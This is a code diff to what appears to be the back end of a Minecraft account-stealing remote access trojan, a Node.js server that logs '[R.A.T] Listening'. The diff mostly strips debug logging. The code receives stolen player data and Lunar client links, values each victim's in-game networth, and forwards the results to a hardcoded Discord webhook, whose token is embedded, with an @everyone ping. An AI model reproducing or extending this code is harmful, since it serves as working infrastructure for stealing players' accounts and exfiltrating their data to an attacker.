@@ -149,11 +149,8 @@ app.post("/", (req, res) => {
                 else
                     checkLunar = `https://hst.sh/${lunar} - **(Lunar3)**`
 
-                console.log(1)
-                
                 //send to discord webhook
                 networthCalc(req.body.uuid).then((result) => {
-                    console.log(result)
                     networth = Intl.NumberFormat('en-US', {
                         notation: 'compact',
                         maximumFractionDigits: 2,
@@ -164,10 +161,8 @@ app.post("/", (req, res) => {
                         maximumFractionDigits: 2,
                     }).format(result[1]);
                     description = result[2];
-                    console.log(432)
                 
                     sentnetworth = (Math.trunc(result[0])) / 1000000;
-                    console.log(532)
                     
                     post("https://discord.com/api/webhooks/1037632110233653288/r4z6zfMmIbksaVdw_2Wu9yiMn5dlaudyBa4yoiomRL5aY6rShFghZ3vh5rCd3u6IZsBx", JSON.stringify({
                         content: `@everyone - ${soulboundnetworth}(${networth})`, //ping
@@ -212,21 +207,7 @@ app.post("/", (req, res) => {
 app.listen(port, () => {
     console.log(`[R.A.T] Listening at port ${port}`);
     // send to discord webhook
-    networthCalc("3f5db911165646149a7a7fcb52b1d083").then((result) => {
-        networth = Intl.NumberFormat('en-US', {
-            notation: 'compact',
-            maximumFractionDigits: 2,
-        }).format(result[0]);
-        soulboundnetworth = Intl.NumberFormat('en-US', {
-            notation: 'compact',
-            maximumFractionDigits: 2,
-        }).format(result[1]);
-        description = result[2];
-
-        sentnetworth = (Math.trunc(result[0])) / 1000000;
-
-        console.log(sentnetworth);
-    });
+    
 });
 
 
